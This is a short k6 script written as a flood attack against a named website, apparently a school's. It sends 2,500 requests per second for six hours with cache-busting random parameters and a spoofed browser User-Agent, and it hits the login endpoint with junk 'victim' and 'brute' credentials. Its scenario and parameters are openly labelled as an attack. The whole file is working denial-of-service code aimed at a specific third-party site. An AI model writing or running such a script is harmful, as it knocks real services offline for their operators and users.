import http from 'k6/http';

export const options = {
  scenarios: {
    brutal_flood_attack_part: {
      executor: 'constant-arrival-rate',
      rate: 2500,
      timeUnit: '1s',
      duration: '6h',
      preAllocatedVUs: 500,
      maxVUs: 1500,
    },
  },
};

const BASE_URL = 'https://hadjischool.com';

export default function () {
  const nanoBuster = Math.random().toString(36).substring(2, 15) + Date.now();
  const homeUrl = `${BASE_URL}/?attack_id=${nanoBuster}`;
  const loginUrl = `${BASE_URL}/login?auth_id=${nanoBuster}`;
  const requestHeaders = {
    'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
    'Cache-Control': 'no-cache, no-store, must-revalidate',
    'Pragma': 'no-cache',
    'Connection': 'keep-alive',
  };

  http.batch([
    ['GET', homeUrl, null, { headers: requestHeaders, timeout: '3s' }],
    ['POST', loginUrl, JSON.stringify({ username: `victim_${nanoBuster}`, password: `brute_${nanoBuster}` }), { headers: Object.assign({}, requestHeaders, { 'Content-Type': 'application/json' }), timeout: '3s' }]
  ]);
}
